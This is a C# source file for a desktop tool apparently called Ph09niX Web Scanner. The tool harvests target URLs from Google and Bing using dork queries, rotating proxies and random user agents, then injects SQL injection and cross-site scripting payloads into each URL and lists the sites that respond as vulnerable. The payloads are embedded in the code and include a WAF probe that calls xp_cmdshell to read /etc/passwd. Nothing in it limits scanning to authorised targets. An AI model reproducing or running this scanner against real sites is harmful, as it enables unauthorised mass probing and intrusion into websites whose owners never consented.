using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Security.Cryptography;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Forms;

namespace APSoft_WebScanner
{
    public partial class MainWindow : Window
    {
        #region locals

        public newHelper helperObject { get; set; }
        public List<string> dorkConfigList = new List<string>();
        public List<string> vulnerAbilities = new List<string>();
        public List<string> proxyTypes = new List<string>();
        public List<string> dorkList = new List<string>();
        public List<itsABug> vulnerableUrlsList = new List<itsABug>();

        #endregion locals

        public void addLog(string text, object obj)
        {
            try
            {
                Dispatcher.Invoke(() =>
                {
                    logRichTextBox.AppendText(text + Environment.NewLine);
                });
            }
            catch (Exception E)
            {
                helperObject.HandleException(E);
            }
        }

        public MainWindow()
        {
            helperObject = new newHelper(addLog, false, this)
            {
                debugMod = false,
                softwareName = "Ph09niX Web Scanner"
            };
            InitializeComponent();
            vulnerAbilities = new List<string>()
            {
                "xss",
                "sql",
                "all"
            };
            proxyTypes = new List<string>()
            {
                "socks4",
                "socks5",
                "http"
            };
            loadVulnerAbilities();
            loadProxyType();
            helperObject.loadList("useragent.txt", ref helperObject.userAgentList);
        }

        private void loadConfigsButton_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                dorkConfigList.Clear();
                OpenFileDialog dialog = new OpenFileDialog
                {
                    Filter = "Text files|*.txt",
                    Title = "Load dork configs",
                    Multiselect = false
                };
                if (dialog.ShowDialog() == System.Windows.Forms.DialogResult.OK)
                {
                    helperObject.loadList(dialog.FileName, ref dorkConfigList);
                    if (dorkConfigList.Count > 0)
                    {
                        List<string> bad = dorkConfigList.Where(func => func.Length < 10 | func.Contains("<DORK>") == false).ToList<string>();
                        foreach (string item in bad)
                        {
                            dorkConfigList.Remove(item);
                        }
                        int count = dorkConfigList.Count;

                        if (dorkConfigList.Count > 0)
                        {
                            dorkConfigList.Add("all");
                            dorkConfigList.Add("none");
                            dorkConfigBox.ItemsSource = dorkConfigList;
                            dorkConfigBox.Items.Refresh();
                        }
                        helperObject.addLog($"{count} valid items added as dork config");
                    }
                }
            }
            catch (Exception E)
            {
                helperObject.HandleException(E);
            }
        }

        private void loadVulnerAbilities()
        {
            try
            {
                vulnerAbilityBox.ItemsSource = vulnerAbilities;
                vulnerAbilityBox.Items.Refresh();
            }
            catch (Exception E)
            {
                helperObject.HandleException(E);
            }
        }

        private void Window_MouseMove(object sender, System.Windows.Input.MouseEventArgs e)
        {
            try
            {
                DragMove();
            }
            catch
            {
            }
        }

        private void useProxyCheckBox_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                if ((bool)useProxyCheckBox.IsChecked)
                {
                    proxyAutoUpdateCheckBox.IsEnabled = proxyUrlTextBox.IsEnabled = loadProxyButton.IsEnabled = proxyTypeBox.IsEnabled = proxyAutoUpdateInterval.IsEnabled = true;
                }
                else
                {
                    proxyAutoUpdateCheckBox.IsEnabled = proxyUrlTextBox.IsEnabled = loadProxyButton.IsEnabled = proxyTypeBox.IsEnabled = proxyAutoUpdateInterval.IsEnabled = false;
                }
            }
            catch (Exception E)
            {
                helperObject.HandleException(E);
            }
        }

        private void addDorkButton_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                string option = "";
                try
                {
                    option = dorkConfigBox.SelectedItem.ToString();
                }
                catch
                {
                }
                List<string> badConfig = new List<string>()
                {
                    "all","none"
                };
                if (option.Length > 0)
                {
                    if (option == "all")
                    {
                        foreach (string item in dorkConfigList)
                        {
                            if (badConfig.Contains(item))
                            {
                                continue;
                            }

                            string generated = item.Replace("<DORK>", dorkTextTextBox.Text);
                            if (dorkList.Contains(generated) == false)
                            {
                                dorkList.Add(generated);
                            }
                        }
                    }
                    else if (option == "none")
                    {
                        string generated = dorkTextTextBox.Text;
                        if (dorkList.Contains(generated) == false)
                        {
                            dorkList.Add(generated);
                        }
                    }
                    else
                    {
                        string generated = option.Replace("<DORK>", dorkTextTextBox.Text);
                        if (dorkList.Contains(generated) == false)
                        {
                            dorkList.Add(generated);
                        }
                    }
                }
                else
                {
                    string generated = dorkTextTextBox.Text;
                    if (dorkList.Contains(generated) == false)
                    {
                        dorkList.Add(generated);
                    }
                }

                helperObject.addLog($"We have {dorkList.Count} dorks in the bank");
            }
            catch (Exception E)
            {
                helperObject.HandleException(E);
            }
        }

        private void loadFromFileButton_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                dorkList.Clear();
                OpenFileDialog dialog = new OpenFileDialog
                {
                    Filter = "Text files|*.txt",
                    Title = "Load dork list",
                    Multiselect = false
                };
                if (dialog.ShowDialog() == System.Windows.Forms.DialogResult.OK)
                {
                    List<string> tempList = new List<string>();
                    helperObject.loadList(dialog.FileName, ref tempList);
                    tempList = tempList.Distinct().ToList<string>();
                    tempList.Sort();
                    foreach (string currentDork in tempList)
                    {
                        string option = "";
                        try
                        {
                            option = dorkConfigBox.SelectedItem.ToString();
                        }
                        catch
                        {
                        }
                        List<string> badConfig = new List<string>()
                {
                    "all","none"
                };
                        if (option.Length > 0)
                        {
                            if (option == "all")
                            {
                                foreach (string item in dorkConfigList)
                                {
                                    if (badConfig.Contains(item))
                                    {
                                        continue;
                                    }

                                    string generated = item.Replace("<DORK>", currentDork);
                                    if (dorkList.Contains(generated) == false)
                                    {
                                        dorkList.Add(generated);
                                    }
                                }
                            }
                            else if (option == "none")
                            {
                                string generated = currentDork;
                                if (dorkList.Contains(generated) == false)
                                {
                                    dorkList.Add(generated);
                                }
                            }
                            else
                            {
                                string generated = option.Replace("<DORK>", currentDork);
                                if (dorkList.Contains(generated) == false)
                                {
                                    dorkList.Add(generated);
                                }
                            }
                        }
                        else
                        {
                            string generated = currentDork;
                            if (dorkList.Contains(generated) == false)
                            {
                                dorkList.Add(generated);
                            }
                        }
                    }
                    helperObject.addLog($"We have {dorkList.Count} dorks in the bank");
                }
            }
            catch (Exception E)
            {
                helperObject.HandleException(E);
            }
        }

        private void clearAllButton_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                dorkList.Clear();
                helperObject.addLog("Dorks bank is empty now");
                dorkTextTextBox.Text = "";
            }
            catch (Exception E)
            {
                helperObject.HandleException(E);
            }
        }

        private void threadTextBox_TextChanged(object sender, System.Windows.Controls.TextChangedEventArgs e)
        {
            try
            {
                Regex rx = new Regex(@"\D{1,1000}");
                if (rx.IsMatch(threadTextBox.Text))
                {
                    threadTextBox.Text = "0";
                }
                else
                {
                    helperObject.CheckingThreads = int.Parse(threadTextBox.Text);
                }
            }
            catch (Exception E)
            {
                helperObject.HandleException(E);
            }
        }

        private void timeOutTextBox_TextChanged(object sender, System.Windows.Controls.TextChangedEventArgs e)
        {
            try
            {
                Regex rx = new Regex(@"\D{1,1000}");
                if (rx.IsMatch(timeOutTextBox.Text))
                {
                    timeOutTextBox.Text = "0";
                }
                else
                {
                    helperObject.timeOut = int.Parse(timeOutTextBox.Text);
                }
            }
            catch (Exception E)
            {
                helperObject.HandleException(E);
            }
        }

        private void proxyUrlTextBox_TextChanged(object sender, System.Windows.Controls.TextChangedEventArgs e)
        {
            try
            {
                if (Uri.IsWellFormedUriString(proxyUrlTextBox.Text, UriKind.Absolute))
                {
                    helperObject.proxyUrl = proxyUrlTextBox.Text;
                }
            }
            catch (Exception E)
            {
                helperObject.HandleException(E);
            }
        }

        private void proxyAutoUpdateInterval_TextChanged(object sender, System.Windows.Controls.TextChangedEventArgs e)
        {
            try
            {
                Regex rx = new Regex(@"\D{1,1000}");
                if (rx.IsMatch(proxyAutoUpdateInterval.Text))
                {
                    proxyAutoUpdateInterval.Text = "0";
                }
                else
                {
                    helperObject.proxyAutoUpdate = int.Parse(proxyAutoUpdateInterval.Text);
                }
            }
            catch (Exception E)
            {
                helperObject.HandleException(E);
            }
        }

        private void loadProxyType()
        {
            try
            {
                proxyTypeBox.ItemsSource = proxyTypes;
                proxyTypeBox.Items.Refresh();
            }
            catch (Exception E)

            {
                helperObject.HandleException(E);
            }
        }

        private void proxyAutoUpdateCheckBox_Checked(object sender, RoutedEventArgs e)
        {
            try
            {
                helperObject.autoUpdateProxy = (bool)proxyAutoUpdateCheckBox.IsChecked;
            }
            catch (Exception E)
            {
                helperObject.HandleException(E);
            }
        }

        private void proxyTypeBox_SelectionChanged(object sender, System.Windows.Controls.SelectionChangedEventArgs e)
        {
            try
            {
                string data = proxyTypeBox.SelectedItem.ToString();
                helperObject.proxyType = data;
            }
            catch (Exception E)
            {
                helperObject.HandleException(E);
            }
        }

        private void Button_Click(object sender, RoutedEventArgs e)
        {
            GC.Collect();
            GC.WaitForPendingFinalizers();
            helperObject.searcherMod = "all";
            if (helperObject.urlsList.Count > 0)
            {
                helperObject.Start(helperObject.urlsList, true);
                if (helperObject.working)
                {
                    helperObject.urlsList.Clear();
                }
            }
            else
            {
                helperObject.Start(dorkList);
            }
        }

        public void Button_Click_1(object sender, RoutedEventArgs e)
        {
            if (stopButton.Content.ToString() == "Stop")
            {
                if (helperObject.urlsList.Count > 0)
                {
                    helperObject.stop();
                    helperObject.urlsList = helperObject.urlsList.Distinct().ToList<string>();
                    statistics.urlFound = helperObject.urlsList.Count;
                    helperObject.showStatusVoid();
                    helperObject.urlsList.Sort();
                    stopButton.Content = "Stop bug checker";
                    Task.Factory.StartNew(() =>
                    {
                        while (true)
                        {
                            if (helperObject.threadlist.Count <= 0)
                            {
                                helperObject.Start(helperObject.urlsList, true);
                                break;
                            }
                            Thread.Sleep(1000);
                        }
                    });
                }
                else
                {
                    helperObject.stop();
                }
            }
            else
            {
                stopButton.Content = "Stop";
                helperObject.stop();
                helperObject.urlsList.Clear();
                helperObject.vulnerAblesList.Clear();
            }
        }

        private void inheritanceTextBox_TextChanged(object sender, System.Windows.Controls.TextChangedEventArgs e)
        {
            try
            {
                Regex rx = new Regex(@"\D{1,1000}");
                if (rx.IsMatch(inheritanceTextBox.Text))
                {
                    inheritanceTextBox.Text = "0";
                }
                else
                {
                    helperObject.inheritance = int.Parse(inheritanceTextBox.Text);
                }
            }
            catch (Exception E)
            {
                helperObject.HandleException(E);
            }
        }

        private void vulnerAbilityBox_SelectionChanged(object sender, System.Windows.Controls.SelectionChangedEventArgs e)
        {
            try
            {
                helperObject.softwareMod = vulnerAbilityBox.SelectedItem.ToString();
            }
            catch (Exception E)
            {
                helperObject.HandleException(E);
            }
        }

        private void Label_MouseDoubleClick(object sender, System.Windows.Input.MouseButtonEventArgs e)
        {
            helperObject.stop();
            Environment.Exit(0);
        }

        private void Label_MouseDoubleClick_1(object sender, System.Windows.Input.MouseButtonEventArgs e)
        {
            WindowState = WindowState.Minimized;
        }

        private void logRichTextBox_TextChanged(object sender, System.Windows.Controls.TextChangedEventArgs e)
        {
            try
            {
                logRichTextBox.ScrollToEnd();
            }
            catch (Exception E)
            {
                helperObject.HandleException(E);
            }
        }

        private void loadCustomUrl_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                dorkConfigList.Clear();
                OpenFileDialog dialog = new OpenFileDialog
                {
                    Filter = "Text files|*.txt",
                    Title = "Load urls",
                    Multiselect = false
                };
                if (dialog.ShowDialog() == System.Windows.Forms.DialogResult.OK)
                {
                    helperObject.loadList(dialog.FileName, ref helperObject.urlsList);
                    if (helperObject.urlsList.Count > 0)
                    {
                        int count = helperObject.urlsList.Count;
                        helperObject.addLog($"{count} valid items added as urls");
                    }
                }
            }
            catch (Exception E)
            {
                helperObject.HandleException(E);
            }
        }

        private void loadProxyButton_Click(object sender, RoutedEventArgs e)
        {
            helperObject.loadProxyByUrl(false);
        }
    }

    public class bingSearcher : modBase
    {
        public bingSearcher(newHelper help, bool useProxy)
        {
            helperObejct = help;
            Name = "bing";
            NeedProxy = useProxy;
        }

        public string Name { get; set; }
        public bool NeedProxy { get; set; }
        public bool UseAble { get; set; }
        public bool NeedCaptcha { get; set; }
        public int transActions { get; set; }
        public newHelper helperObejct { get; set; }

        public bool CanUse()
        {
            return true;
        }

        public bruteResult Config(ref string dork, string objectString, string proxy = null, string additionalOne = null, string additionalTwo = null)
        {
            transActions++;
            try
            {
                string userAgent = Leaf.xNet.Http.RandomUserAgent();
                int countMax = helperObejct.inheritance * 1000;
                int countNow = 0;
                Leaf.xNet.HttpRequest req = new Leaf.xNet.HttpRequest()
                {
                    IgnoreProtocolErrors = true,
                    AllowAutoRedirect = true,
                    Cookies = new CookieStorage(false),
                    ConnectTimeout = helperObejct.timeOut * 1000,
                    ReadWriteTimeout = helperObejct.timeOut * 1000,
                    KeepAlive = true,
                    UserAgent = userAgent
                };
                again:
                req.UserAgent = userAgent;
                if (NeedProxy)
                {
                    helperObejct.setProxy(ref req, proxy);
                }
                string url = "https://www.bing.com/search?q=" + dork + "&first=" + countNow;
                req.Get(url);
                string source = req.Response.ToString();
                Regex rx = new Regex(@"<a href=""(\S{1,1000})"" h=""ID=\S{1,1000}"">");
                MatchCollection mt = rx.Matches(source);
                foreach (Match item in mt)
                {
                    string val = item.Groups[1].Value.ToString();
                    if (Uri.IsWellFormedUriString(val, UriKind.Absolute))
                    {
                        if (!helperObejct.urlsList.Contains(val))
                        {
                            helperObejct.urlsList.Add(val);
                            helperObejct.Save(val, "Bing");
                            Interlocked.Increment(ref statistics.urlFound);
                            Interlocked.Increment(ref statistics.bing);
                            helperObejct.showStatusVoid();
                        }
                    }
                }
                countNow += 50;
                if (countNow >= countMax)
                {
                    transActions--;
                    return bruteResult.itsSearcher;
                }
                else
                {
                    goto again;
                }
            }
            catch (Exception E)
            {
                transActions--;
                helperObejct.HandleException(E);
                return bruteResult.error;
            }
        }
    }

    public class googleSearcher : modBase
    {
        public googleSearcher(newHelper help, bool useProxy)
        {
            helperObejct = help;
            Name = "google";
            NeedProxy = useProxy;
        }

        public string Name { get; set; }
        public bool NeedProxy { get; set; }
        public bool UseAble { get; set; }
        public bool NeedCaptcha { get; set; }
        public int transActions { get; set; }
        public newHelper helperObejct { get; set; }

        public bool CanUse()
        {
            return true;
        }

        public bruteResult Config(ref string dork, string objectString, string proxy = null, string additionalOne = null, string additionalTwo = null)
        {
            transActions++;
            try
            {
                string userAgent = Leaf.xNet.Http.RandomUserAgent();
                Leaf.xNet.HttpRequest req = new Leaf.xNet.HttpRequest()
                {
                    IgnoreProtocolErrors = true,
                    AllowAutoRedirect = true,
                    Cookies = new CookieStorage(false),
                    ConnectTimeout = helperObejct.timeOut * 1000,
                    ReadWriteTimeout = helperObejct.timeOut * 1000,
                    KeepAlive = true,
                    UserAgent = userAgent
                };
                again:
                req.UserAgent = userAgent;
                if (NeedProxy)
                {
                    helperObejct.setProxy(ref req, proxy);
                }
                req.Get("https://www.google.com/ncr");
                req.ClearAllHeaders();
                req.Cookies = req.Response.Cookies;
                string url = $"https://www.google.com/search?q={dork}&num=100&hl=en&complete=0&safe=off&filter=0&btnG=Search&start=0";
                req.Get(url);
                string source = req.Response.ToString();
                string nextPage = Regex.Match(source, @"href=""(\S{1,1000})"" aria-label=""Next page""").Groups[1].Value.ToString();
                source = WebUtility.UrlDecode(source);
                Regex rx = new Regex(@"<a href=""/url[?]q=(\S{1,100})[&amp]");
                MatchCollection mt = rx.Matches(source);
                foreach (Match item in mt)
                {
                    string val = item.Groups[1].Value.ToString();
                    val = Regex.Replace(val, @"&amp\S{1,10000}", "");
                    if (Uri.IsWellFormedUriString(val, UriKind.Absolute))
                    {
                        if (!helperObejct.urlsList.Contains(val))
                        {
                            helperObejct.urlsList.Add(val);
                            helperObejct.Save(val, "Google");
                            Interlocked.Increment(ref statistics.urlFound);
                            Interlocked.Increment(ref statistics.google);
                            helperObejct.showStatusVoid();
                        }
                    }
                }
                if (nextPage.Length > 10)
                {
                    url = "https://www.google.com" + nextPage;
                    goto again;
                }
                else
                {
                    transActions--;
                    return bruteResult.itsSearcher;
                }
            }
            catch (Exception E)
            {
                transActions--;
                helperObejct.HandleException(E);
                return bruteResult.error;
            }
        }
    }

    public class allSearcher : modBase
    {
        public allSearcher(newHelper help, bool useProxy)
        {
            helperObejct = help;
            Name = "all";
            NeedProxy = useProxy;
        }

        public string Name { get; set; }
        public bool NeedProxy { get; set; }
        public bool UseAble { get; set; }
        public bool NeedCaptcha { get; set; }
        public int transActions { get; set; }
        public newHelper helperObejct { get; set; }

        public bool CanUse()
        {
            return true;
        }

        public bruteResult Config(ref string dork, string objectString, string proxy = null, string additionalOne = null, string additionalTwo = null)
        {
            transActions++;
            bruteResult googleSearcher = helperObejct.searchersList.FirstOrDefault(func => func.Name == "google").Config(ref dork, objectString, proxy, additionalOne, additionalTwo);
            bruteResult bingSearcher = helperObejct.searchersList.FirstOrDefault(func => func.Name == "bing").Config(ref dork, objectString, proxy, additionalOne, additionalTwo);
            transActions--;
            return bruteResult.itsSearcher;
        }
    }

    public class sqlChecker : modBase
    {
        public sqlChecker(newHelper help, bool useProxy)
        {
            helperObejct = help;
            Name = "sql";
            NeedProxy = false;
        }

        public string Name { get; set; }
        public bool NeedProxy { get; set; }
        public bool UseAble { get; set; }
        public bool NeedCaptcha { get; set; }
        public int transActions { get; set; }
        public newHelper helperObejct { get; set; }

        public bool CanUse()
        {
            return true;
        }

        private string randomText(int length)
        {
            byte[] bt = new byte[length];
            using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
            {
                rng.GetBytes(bt);
            }
            return BitConverter.ToString(bt).Replace("-", "").ToLower();
        }

        public bool wafProtection(string url)
        {
            try
            {
                string payLoad = " AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert(\"XSS\")</script>',table_name FROM information_schema.tables WHERE 2>1--/**/; EXEC xp_cmdshell('cat ../../../etc/passwd')#";
                Leaf.xNet.HttpRequest req = new Leaf.xNet.HttpRequest()
                {
                    Cookies = new CookieStorage(false),
                    ConnectTimeout = 20000,
                    ReadWriteTimeout = 20000,
                    IgnoreProtocolErrors = true
                };

                req.Get(url);
                string source = req.Response.ToString();
                List<string> urls = helperObejct.insertPayload(url, payLoad);
                foreach (string item in urls)
                {
                    req.Get(item);
                    string newSource = req.Response.ToString();
                    if (newSource.Length <= 50)
                    {
                        return true;
                    }
                    if (req.Response.StatusCode.ToString() != "OK")
                    {
                        return true;
                    }
                }

                return false;
            }
            catch (Exception E)
            {
                return true;
            }
        }

        public bruteResult Config(ref string dork, string objectString, string proxy = null, string additionalOne = null, string additionalTwo = null)
        {
            transActions++;
            try
            {
                List<string> sqlpayloads = new List<string>()
                {
                    "'",
                    ".(('\".,,,,",
                    "AND 7786=7473-- FNiT",
                    "\"(().()('.",
                    "'YgxvMp<'\">AqklPj",
                    "') AND 7648=7021 AND ('vhCh'='vhCh",
                    " AND (SELECT 5232 FROM(SELECT COUNT(*),CONCAT(0x7178717071,(SELECT (ELT(5232=5232,1))),0x7176717171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- FeKK",
                    " AND 2229 IN (SELECT (CHAR(113)+CHAR(120)+CHAR(113)+CHAR(112)+CHAR(113)+(SELECT (CASE WHEN (2229=2229) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(113)+CHAR(113)+CHAR(113)))"
                };
                string userAgent = Leaf.xNet.Http.RandomUserAgent();
                bool waf = false;
                if (wafProtection(dork))
                {
                    waf = true;
                }
                Leaf.xNet.HttpRequest req = new Leaf.xNet.HttpRequest()
                {
                    IgnoreProtocolErrors = true,
                    AllowAutoRedirect = false,
                    Cookies = new CookieStorage(false),
                    ConnectTimeout = helperObejct.timeOut * 1000,
                    ReadWriteTimeout = helperObejct.timeOut * 1000,
                    KeepAlive = false,
                    UserAgent = userAgent
                };
                string baseSource = "";
                foreach (string item in sqlpayloads)
                {
                    if (NeedProxy)
                    {
                        helperObejct.setProxy(ref req, proxy);
                    }
                    List<string> urls = helperObejct.insertPayload(dork, item);
                    foreach (string urlChecking in urls)
                    {
                        if (urlChecking == "itsnotInjectAble")
                        {
                            transActions--;
                            return bruteResult.unvulnerAble;
                        }
                        else
                        {
                            if (baseSource.Length <= 0)
                            {
                                baseSource = req.Get(dork).ToString();
                            }
                            req.Get(urlChecking);
                            string source = req.Response.ToString().ToLower();
                            List<string> targetBugs = new List<string>()
                {
                    "warning: mysql_connect()",
                    "warning: mysql_fetch_row()",
                    "error in your sql syntax",
                    "warning: mysql_result()",
                    "mysql_num_rows()",
                    "mysql_fetch_assoc()",
                    "mysql_fetch_row()",
                    "mysql_numrows()",
                    "mysql_fetch_object()",
                    "MySQL Driver",
                    "MySQL ODBC",
                    "MySQL Error",
                    "error in your SQL syntax"
                };
                            foreach (string ite in targetBugs)
                            {
                                if (source.Contains(ite.ToLower()) && baseSource.Contains(ite) == false)
                                {
                                    transActions--;
                                    try
                                    {
                                        string url = dork;
                                        helperObejct.mainFormObject.Dispatcher.Invoke(() =>
                                        {
                                            itsABug bug = new itsABug()
                                            {
                                                id = (helperObejct.mainFormObject.vulnerableUrlsList.Count + 1).ToString(),
                                                url = url,
                                                vulnerability = "sql",
                                                WAF = waf.ToString(),
                                                payload = item
                                            };
                                            helperObejct.mainFormObject.vulnerableUrlsList.Add(bug);
                                            helperObejct.mainFormObject.resultView.ItemsSource = helperObejct.mainFormObject.vulnerableUrlsList;
                                            helperObejct.mainFormObject.resultView.Items.Refresh();
                                        });
                                        dork = $"url={dork} | WAF={waf.ToString()} | payload={item.ToString()}";
                                    }
                                    catch
                                    {
                                    }

                                    return bruteResult.sql;
                                }
                            }
                        }
                    }
                }
                transActions--;
                return bruteResult.unvulnerAble;
            }
            catch
            {
                transActions--;
                return bruteResult.unvulnerAble;
            }
        }
    }

    public class xssChecker : modBase
    {
        public xssChecker(newHelper help, bool useProxy)
        {
            helperObejct = help;
            Name = "xss";
            NeedProxy = useProxy;
        }

        public string Name { get; set; }
        public bool NeedProxy { get; set; }
        public bool UseAble { get; set; }
        public bool NeedCaptcha { get; set; }
        public int transActions { get; set; }
        public newHelper helperObejct { get; set; }

        public bool CanUse()
        {
            return true;
        }

        private string randomText(int length)
        {
            byte[] bt = new byte[length];
            using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
            {
                rng.GetBytes(bt);
            }
            return BitConverter.ToString(bt).Replace("-", "").ToLower();
        }

        public bool wafProtection(string url)
        {
            try
            {
                string payLoad = " AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert(\"XSS\")</script>',table_name FROM information_schema.tables WHERE 2>1--/**/; EXEC xp_cmdshell('cat ../../../etc/passwd')#";
                Leaf.xNet.HttpRequest req = new Leaf.xNet.HttpRequest()
                {
                    Cookies = new CookieStorage(false),
                    ConnectTimeout = 20000,
                    ReadWriteTimeout = 20000,
                    IgnoreProtocolErrors = true
                };

                req.Get(url);
                string source = req.Response.ToString();
                List<string> urls = helperObejct.insertPayload(url, payLoad);
                foreach (string item in urls)
                {
                    req.Get(item);
                    string newSource = req.Response.ToString();
                    if (newSource.Length <= 50)
                    {
                        return true;
                    }
                    if (req.Response.StatusCode.ToString() != "OK")
                    {
                        return true;
                    }
                }

                return false;
            }
            catch (Exception E)
            {
                return true;
            }
        }

        public bruteResult Config(ref string dork, string objectString, string proxy = null, string additionalOne = null, string additionalTwo = null)
        {
            transActions++;
            try
            {
                bool waf = false;
                if (wafProtection(dork))
                {
                    waf = true;
                }
                string first = randomText(3);
                string sec = randomText(3);
                string finalpayloadTest = "'" + first + "<'\">" + sec + "";
                string finalpayloadCheck = "" + first + "<'\">" + sec + "";
                string finalpayloadCheck2 = $@"{first}<\'\"">{sec}";
                List<string> xsspayloads = new List<string>()
                {
                    finalpayloadTest,
                    "%27%3EPH09NIXPY74X0%3Csvg%2Fonload%3Dconfirm%28%2FPH09NIXPY74X%2F%29%3Eweb",
                    "%22%3EPH09NIXPY74X0%3Csvg%2Fonload%3Dconfirm%28%2FPH09NIXPY74X%2F%29%3Eweb",
                    "PH09NIXPY74X%3Csvg%2Fonload%3Dconfirm%28%2FPH09NIXPY74X%2F%29%3Eweb",
                };
                List<string> containsList = new List<string>()
                {
                    finalpayloadCheck2,finalpayloadCheck
                };
                string userAgent = Leaf.xNet.Http.RandomUserAgent();
                string sourceBase = "";
                foreach (string item in xsspayloads)
                {
                    List<string> urls = helperObejct.insertPayload(dork, item);
                    foreach (string urlNew in urls)
                    {
                        if (urlNew == "itsnotInjectAble")
                        {
                            transActions--;
                            return bruteResult.unvulnerAble;
                        }
                        else
                        {
                            Leaf.xNet.HttpRequest req = new Leaf.xNet.HttpRequest()
                            {
                                IgnoreProtocolErrors = true,
                                AllowAutoRedirect = true,
                                Cookies = new CookieStorage(false),
                                ConnectTimeout = helperObejct.timeOut * 1000,
                                ReadWriteTimeout = helperObejct.timeOut * 1000,
                                KeepAlive = false,
                                UserAgent = userAgent
                            };
                            if (sourceBase.Length <= 0)
                            {
                                sourceBase = req.Get(dork).ToString();
                            }
                            string source = req.Get(urlNew).ToString();
                            Regex rx = new Regex("PH09NIXPY74X<svg|" + finalpayloadCheck + "|" + finalpayloadCheck2);
                            if (rx.IsMatch(source) && rx.IsMatch(sourceBase) == false)
                            {
                                transActions--;
                                try
                                {
                                    string url = dork;
                                    helperObejct.mainFormObject.Dispatcher.Invoke(() =>
                                    {
                                        itsABug bug = new itsABug()
                                        {
                                            id = (helperObejct.mainFormObject.vulnerableUrlsList.Count + 1).ToString(),
                                            url = url,
                                            vulnerability = "xss",
                                            WAF = waf.ToString(),
                                            payload = item
                                        };
                                        helperObejct.mainFormObject.vulnerableUrlsList.Add(bug);
                                        helperObejct.mainFormObject.resultView.ItemsSource = helperObejct.mainFormObject.vulnerableUrlsList;
                                        helperObejct.mainFormObject.resultView.Items.Refresh();
                                    });
                                    dork = $"url={dork} | WAF={waf.ToString()} | payload={item.ToString()}";
                                }
                                catch
                                {
                                }

                                return bruteResult.xss;
                            }
                            else
                            {
                                foreach (var STR in containsList)
                                {
                                    if (source.Contains(STR) && source.Contains(STR) == false)
                                    {
                                        transActions--;
                                        try
                                        {
                                            string url = dork;
                                            helperObejct.mainFormObject.Dispatcher.Invoke(() =>
                                            {
                                                itsABug bug = new itsABug()
                                                {
                                                    id = (helperObejct.mainFormObject.vulnerableUrlsList.Count + 1).ToString(),
                                                    url = url,
                                                    vulnerability = "xss",
                                                    WAF = waf.ToString(),
                                                    payload = item
                                                };
                                                helperObejct.mainFormObject.vulnerableUrlsList.Add(bug);
                                                helperObejct.mainFormObject.resultView.ItemsSource = helperObejct.mainFormObject.vulnerableUrlsList;
                                                helperObejct.mainFormObject.resultView.Items.Refresh();
                                            });
                                            dork = $"url={dork} | WAF={waf.ToString()} | payload={item.ToString()}";
                                        }
                                        catch
                                        {
                                        }

                                        return bruteResult.xss;
                                    }
                                }
                            }
                        }
                    }
                }
                transActions--;
                return bruteResult.unvulnerAble;
            }
            catch
            {
                transActions--;
                return bruteResult.unvulnerAble;
            }
        }
    }

    public class sqlXssChecker : modBase
    {
        public sqlXssChecker(newHelper help, bool useProxy)
        {
            helperObejct = help;
            Name = "all";
            NeedProxy = useProxy;
        }

        public string Name { get; set; }
        public bool NeedProxy { get; set; }
        public bool UseAble { get; set; }
        public bool NeedCaptcha { get; set; }
        public int transActions { get; set; }
        public newHelper helperObejct { get; set; }

        public bool CanUse()
        {
            return true;
        }

        private string randomText(int length)
        {
            byte[] bt = new byte[length];
            using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
            {
                rng.GetBytes(bt);
            }
            return BitConverter.ToString(bt).Replace("-", "").ToLower();
        }

        public bruteResult Config(ref string dork, string objectString, string proxy = null, string additionalOne = null, string additionalTwo = null)
        {
            transActions++;
            bool itsSql = false;
            bool itsXss = false;
            string unTouchDork = dork;
            string unTouchDork2 = dork;
            bruteResult sql = helperObejct.softwareMods.FirstOrDefault(func => func.Name == "sql").Config(ref unTouchDork, objectString, proxy, additionalOne, additionalTwo);
            if (sql == bruteResult.sql)
            {
                itsSql = true;
            }
            else
            {
                itsSql = false;
            }
            bruteResult xss = helperObejct.softwareMods.FirstOrDefault(func => func.Name == "xss").Config(ref unTouchDork2, objectString, proxy, additionalOne, additionalTwo);
            if (xss == bruteResult.xss)
            {
                itsXss = true;
            }
            else
            {
                itsXss = false;
            }
            transActions--;
            if (itsXss)
            {
                if (itsSql)
                {
                    dork = unTouchDork + "*" + unTouchDork2;
                    return bruteResult.sqlXss;
                }
                else
                {
                    dork = unTouchDork2;
                    return bruteResult.xss;
                }
            }
            else
            {
                if (itsSql)
                {
                    dork = unTouchDork;

                    return bruteResult.sql;
                }
                else
                {
                    return bruteResult.unvulnerAble;
                }
            }
        }
    }
}